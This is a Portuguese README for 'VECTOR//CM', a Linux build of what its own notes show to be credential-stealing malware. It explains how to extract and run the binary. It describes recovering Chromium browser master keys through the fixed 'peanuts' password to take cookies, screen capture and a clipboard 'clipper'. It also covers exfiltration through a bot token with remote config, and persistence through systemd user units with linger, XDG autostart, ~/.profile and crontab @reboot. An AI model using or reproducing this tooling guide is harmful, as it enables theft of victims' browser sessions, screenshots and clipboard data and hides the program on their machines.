# VECTOR//CM — versão Linux

Binários nativos para Linux, self-contained (não precisam de .NET instalado).

```
vectorcm-linux-x64.tar.gz      x86-64 (Intel/AMD)
vectorcm-linux-arm64.tar.gz    aarch64 (Raspberry Pi, ARM)
```

## Extrair

```bash
tar -xzf vectorcm-linux-x64.tar.gz
chmod +x vectorcm
```

O pacote traz:

```
vectorcm            o executável (ELF, self-contained, single-file)
libe_sqlite3.so     a native do SQLite — TEM de estar ao lado do vectorcm
config.json         o token do bot + os canais
```

## Primeiro teste

```bash
./vectorcm --doctor                        # diagnóstico (não escreve nada)
./vectorcm --console --once --no-persist   # um ciclo, sem instalar persistência
```

## Executar

```bash
./vectorcm                  # daemoniza (setsid + nohup) e fica em background
./vectorcm --console        # à frente, no terminal
./vectorcm --uninstall      # remove a persistência (systemd/autostart/profile/cron)
```

## Notas

- O **token não está no binário**: vem do `config.json` ao lado, do
  `SYNC_BOT_TOKEN` ou do config remoto (`SYNC_CONFIG_URL`).
- A master key dos browsers no Linux usa a password fixa do Chromium
  ("peanuts"). Se o browser estiver ligado a um **keyring** (GNOME Keyring /
  KWallet), a master key não é recuperável sem a sessão do keyring — os
  cookies ficam a zero e o binário avisa no log.
- Screenshot: precisa de `scrot`, `import`, `maim`, `gnome-screenshot`,
  `spectacle`, `flameshot` ou `xfce4-screenshooter`, e de `DISPLAY`/
  `WAYLAND_DISPLAY`.
- Clipper: `xclip`/`xsel` (X11) ou `wl-copy`/`wl-paste` (Wayland).
- Persistência: `systemd --user` (+ `loginctl enable-linger`), autostart do
  XDG, `~/.profile` e `crontab @reboot`.
- O estado fica em `~/.config/vectorcm` (0700).
